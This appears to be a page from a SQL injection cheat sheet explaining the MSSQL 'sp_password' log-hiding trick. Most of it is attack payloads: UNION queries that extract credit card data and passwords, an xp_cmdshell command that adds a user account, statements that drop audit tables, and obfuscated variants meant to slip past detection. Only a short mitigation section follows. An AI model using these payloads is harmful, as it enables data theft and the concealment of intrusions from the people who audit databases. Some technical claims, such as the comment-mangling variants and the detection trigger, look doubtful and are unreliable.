---
title: SP_PASSWORD (Hiding Query)
description: Using SP_PASSWORD to hide SQL queries in MSSQL logs
category: Advanced Techniques
order: 14
tags: ["sp_password", "log evasion", "query hiding"]
lastUpdated: 2025-03-15
---

## SP_PASSWORD (Hiding Query)

The `SP_PASSWORD` technique is a method to prevent SQL queries from being logged in the SQL Server logs. This approach takes advantage of a security feature in Microsoft SQL Server that was designed to prevent sensitive information like passwords from being recorded in logs.

### How SP_PASSWORD Works

When SQL Server detects the string `sp_password` anywhere in a query, it automatically prevents that query from being recorded in the SQL Server logs. This behavior was originally implemented to prevent passwords from being visible in logs when procedures like `sp_addlogin` or `sp_password` are used.

However, this "feature" can be exploited by attackers to hide malicious activities by simply including the string `sp_password` in their attack queries.

### Basic Usage

```sql
-- Normal query (would be logged)
SELECT * FROM users;

-- Query with sp_password (would NOT be logged)
SELECT * FROM users--sp_password

-- Another example
'; DROP TABLE critical_data--sp_password
```

### Practical Applications in SQL Injection

#### Preventing Detection

By appending `--sp_password` to injected SQL, attackers can prevent their activities from appearing in SQL Server logs:

```sql
-- Standard SQL injection
' OR 1=1--

-- SQL injection that won't be logged
' OR 1=1--sp_password
```

#### Hiding Data Exfiltration

```sql
-- Data exfiltration query that won't be logged
' UNION SELECT creditcard_number, cvv, expiration FROM customer_payments--sp_password
```

#### Hiding Database Structure Discovery

```sql
-- Table discovery that won't be logged
' UNION SELECT table_name, column_name FROM information_schema.columns--sp_password
```

#### Hiding Schema Modifications

```sql
-- Schema modification that won't be logged
'; ALTER TABLE users ADD backdoor_column VARCHAR(100)--sp_password
```

### Avoiding String Literal Detection

If a security system looks for the exact string `sp_password`, variations can sometimes work:

```sql
-- Using character insertion
' UNION SELECT * FROM users--sp_pas+sword

-- Using comment insertion
' UNION SELECT * FROM users--sp_p/*comment*/assword

-- Using case variation
' UNION SELECT * FROM users--sp_PassWord

-- Dynamic construction
DECLARE @s VARCHAR(100) = 's' + 'p_p' + 'assw' + 'ord'
EXEC('SELECT * FROM users--' + @s)
```

### Combining with Other Techniques

SP_PASSWORD can be combined with other SQL injection techniques for greater effectiveness:

```sql
-- With UNION attack
' UNION SELECT username, password FROM users--sp_password

-- With xp_cmdshell
'; EXEC xp_cmdshell 'net user hacker password /add'--sp_password

-- With stacked queries
'; DROP TABLE audit_logs; CREATE TABLE backdoor(id int)--sp_password
```

### Evading Other Security Mechanisms

SP_PASSWORD can be used with other evasion techniques:

```sql
-- Combining with CHAR() encoding
'; EXEC(CHAR(115) + CHAR(101) + CHAR(108) + CHAR(101) + CHAR(99) + CHAR(116) + CHAR(32) + CHAR(42) + CHAR(32) + CHAR(102) + CHAR(114) + CHAR(111) + CHAR(109) + CHAR(32) + CHAR(117) + CHAR(115) + CHAR(101) + CHAR(114) + CHAR(115))--sp_password
-- This builds and executes: 'select * from users'
```

### Limitations

1. While the query isn't logged in SQL Server logs, it may still be:
   - Logged by application-level logging
   - Captured by network monitoring tools
   - Detected by database activity monitoring solutions
   - Visible in query performance monitoring

2. Modern security tools and WAFs are often aware of this technique and look for it specifically

3. The effectiveness varies across SQL Server versions - newer versions have improved security features

### Version Specifics

| SQL Server Version | Behavior                                                                      |
| ------------------ | ----------------------------------------------------------------------------- |
| SQL Server 2000    | Original behavior - query completely hidden                                   |
| SQL Server 2005+   | Some improvements, but basic technique still works                            |
| SQL Server 2012+   | Additional logging mechanisms may still capture queries                       |
| SQL Server 2016+   | Advanced threat protection features may detect suspicious patterns regardless |

### Detection and Mitigation Strategies

To protect against SP_PASSWORD attacks, consider:

1. Implementing application-level query logging independent of SQL Server logs

2. Using database activity monitoring tools that capture queries before they reach SQL Server

3. Implementing Web Application Firewalls with rules to detect and block sp_password usage

4. Using database proxies that can detect and alert on suspicious query patterns

5. Implementing parameterized queries to prevent SQL injection in the first place

6. Using custom triggers to audit suspicious activities:

```sql
-- Example trigger to detect suspicious activity
CREATE TRIGGER detect_sp_password
ON ALL SERVER
FOR DDL_SERVER_LEVEL_EVENTS
AS
BEGIN
    DECLARE @data XML
    SET @data = EVENTDATA()

    IF @data.value('(/EVENT_INSTANCE/TSQLCommand/CommandText)[1]', 'nvarchar(max)') LIKE '%sp_password%'
    BEGIN
        -- Log to a custom audit table that won't be affected by sp_password
        INSERT INTO custom_security_audit (event_time, user_name, event_type, sql_text)
        VALUES (
            GETDATE(),
            @data.value('(/EVENT_INSTANCE/LoginName)[1]', 'nvarchar(128)'),
            'POTENTIAL_LOG_BYPASS',
            @data.value('(/EVENT_INSTANCE/TSQLCommand/CommandText)[1]', 'nvarchar(max)')
        )
    END
END
```

### Historical Context

This technique has been known for many years and was a significant security concern in older SQL Server versions. While Microsoft has improved logging and security mechanisms in newer versions, the basic behavior still exists for backward compatibility reasons.

The technique was originally documented to help DBAs understand why some queries might not appear in logs, but it quickly became a well-known method for attackers to hide their activities.
